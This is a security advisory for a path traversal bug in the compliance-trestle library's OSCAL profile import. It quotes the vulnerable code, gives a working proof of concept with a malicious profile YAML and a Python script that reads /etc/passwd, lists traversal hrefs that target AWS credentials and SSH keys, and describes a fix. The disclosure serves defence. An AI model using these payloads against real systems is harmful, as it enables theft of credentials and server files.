# [M] compliance-trestle Profile Import has an Arbitrary File Read via trestle:// URI and Relative Path Traversal

## Summary
Severity: Medium
Advisory: GHSA-mj4x-vf5c-5xg8
CVE: CVE-2026-45774
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-05-28
Source: https://github.com/advisories/GHSA-mj4x-vf5c-5xg8
Type: github-advisory

## Affected
- PyPI: `compliance-trestle` — affected >=4.0.0 <4.0.3
- PyPI: `compliance-trestle` — affected >=0 <3.12.2

## Details
## Summary

The compliance-trestle library's profile import mechanism resolves `trestle://` URIs and relative file paths by joining them with `trestle_root` and calling `.resolve()`, but performs **no boundary check** to ensure the resolved path stays within the trestle workspace. An attacker can craft a malicious OSCAL profile YAML with `imports[].href` containing path traversal sequences to read arbitrary files from the server filesystem.

Three attack vectors confirmed:
1. **PT-001:** `trestle://../../etc/passwd` — via trestle:// URI scheme
2. **PT-002:** `../../etc/passwd` — via relative path in href
3. **PT-003:** back_matter rlinks with traversal paths

**Preconditions:** Victim must import/resolve an attacker-controlled OSCAL profile YAML.


## Affected Component

**Repository:** https://github.com/IBM/compliance-trestle
**File:** `trestle/core/remote/cache.py` (lines 175-179)
**File:** `trestle/core/resolver/_import.py` (line 104)
**Version:** v4.0.2 (latest as of 2026-04-30)

## Vulnerable Code

### cache.py:175-179 — LocalFetcher (trestle:// URI handling)

```python
class LocalFetcher(FetcherBase):
    def __init__(self, trestle_root: pathlib.Path, uri: str) -> None:
        super().__init__(trestle_root, uri)
        # ...
        elif uri.startswith(const.TRESTLE_HREF_HEADING):
            uri = str(trestle_root / uri[len(const.TRESTLE_HREF_HEADING) :])
            self._abs_path = pathlib.Path(uri).resolve()
            # ❌ NO boundary check — .resolve() follows ../
            # ❌ NO is_relative_to() validation
            # ❌ Result can be /etc/passwd
            self._cached_object_path = self._abs_path
            return
```

### cache.py:194 — LocalFetcher (relative path handling)

```python
        # For relative paths (no trestle:// or file:// prefix):
        try:
            self._abs_path = pathlib.Path(uri).resolve()
            # ❌ Same issue — resolves relative to CWD with no boundary check
        except Exception:
            raise TrestleError(...)
```

### _import.py:73-104 — Profile import href resolution

```python
class Import(Pipeline.Filter):
    def __init__(self, ...):
        # Line 73-83: back_matter rlinks used directly
        if self._import.href[0] == '#':
            resource = [r for r in self._resources if r.uuid == self._import.href[1:]][0]
            self._import.href = [
                rlink.href  # ❌ rlink.href from OSCAL data — user-controlled
                for rlink in resource.rlinks
                if rlink.href.endswith('.json') or rlink.href.endswith('.yaml')
            ][0]

        # Line 104: href passed directly to FetcherFactory
        fetcher = cache.FetcherFactory.get_fetcher(self._trestle_root, self._import.href)
```

**Root Cause:**
1. `Path(trestle_root / "../../etc/passwd").resolve()` = `/etc/passwd`
2. No `is_relative_to(trestle_root)` check after resolve
3. `TRESTLE_HREF_REGEX` defined at `const.py:253` but **NEVER enforced** (dead code)
4. Even if enforced, the regex `'^trestle://[^/]'` would PASS traversal payloads (`.` is `[^/]`)


## Steps to Reproduce

### Prerequisites

```bash
pip install compliance-trestle==4.0.2
```

### PoC: Malicious OSCAL Profile

```yaml
# malicious_profile.yaml
profile:
  uuid: "550e8400-e29b-41d4-a716-446655440000"
  metadata:
    title: "Malicious Profile"
    version: "1.0"
    last-modified: "2024-01-01T00:00:00+00:00"
    oscal-version: "1.0.4"
  imports:
    - href: "trestle://../../../../../../etc/passwd"
```

### PoC: Direct LocalFetcher Exploit

```python
#!/usr/bin/env python3
"""PoC: trestle:// path traversal via real LocalFetcher"""
from pathlib import Path
from trestle.core.remote.cache import LocalFetcher
import tempfile

trestle_root = Path(tempfile.mkdtemp())

# Normal usage — stays within workspace
normal = LocalFetcher(trestle_root, "trestle://catalogs/test/catalog.json")
print(f"Normal: {normal._abs_path}")  # /tmp/xxx/catalogs/test/catalog.json

# Exploit — escapes workspace
evil = LocalFetcher(trestle_root, "trestle://../../../../../../etc/passwd")
print(f"Evil:   {evil._abs_path}")    # /etc/passwd
print(f"Content: {evil._abs_path.read_text().split(chr(10))[0]}")
# Output: root:x:0:0:root:/root:/bin/bash
```

**Expected:** Path traversal blocked with error
**Actual:** `/etc/passwd`, `/etc/shadow`, `/proc/self/environ` read successfully


## Remediation

```python
class LocalFetcher(FetcherBase):
    def __init__(self, trestle_root: pathlib.Path, uri: str) -> None:
        super().__init__(trestle_root, uri)
        # ...
        elif uri.startswith(const.TRESTLE_HREF_HEADING):
            uri = str(trestle_root / uri[len(const.TRESTLE_HREF_HEADING) :])
            self._abs_path = pathlib.Path(uri).resolve()

            # ✅ ADD: Boundary check
            if not self._abs_path.is_relative_to(self._trestle_root):
                raise TrestleError(
                    f"Path traversal blocked: resolved path '{self._abs_path}' "
                    f"is outside trestle root '{self._trestle_root}'"
                )

            self._cached_object_path = self._abs_path
            return
```

Same fix needed for relative path handling at line 194.

Additionally, enforce `TRESTLE_HREF_REGEX` (already defined at `const.py:253` but never used).


## Resources

- **CWE-22:** https://cwe.mitre.org/data/definitions/22.html
- **OSCAL Profile Resolution:** https://pages.nist.gov/OSCAL/concepts/processing/profile-resolution/
- **compliance-trestle:** https://github.com/IBM/compliance-trestle

## Impact

1. **Credential Theft via OSCAL Import:**
   ```yaml
   imports:
     - href: "trestle://../../root/.aws/credentials"
     - href: "trestle://../../root/.ssh/id_rsa"
   ```

2. **System Reconnaissance:**
   ```yaml
   imports:
     - href: "trestle://../../etc/passwd"
     - href: "trestle://../../proc/self/environ"
   ```

3. **Supply Chain Attack:**
   Attacker publishes malicious OSCAL profile to public compliance catalog. Organizations importing it leak server files during profile resolution.

4. **Dead Code Evidence:**
   `TRESTLE_HREF_REGEX` defined at `const.py:253` but never enforced anywhere — proves path validation was INTENDED but never implemented.

## References
- https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-mj4x-vf5c-5xg8
- https://github.com/oscal-compass/compliance-trestle/commit/5c65c5926fe7ca908b9c1d281f904e7d97ba8310
- https://github.com/oscal-compass/compliance-trestle/commit/d00a0c2f702c24f7016009fbd626036f5c46f47b
- https://github.com/oscal-compass/compliance-trestle
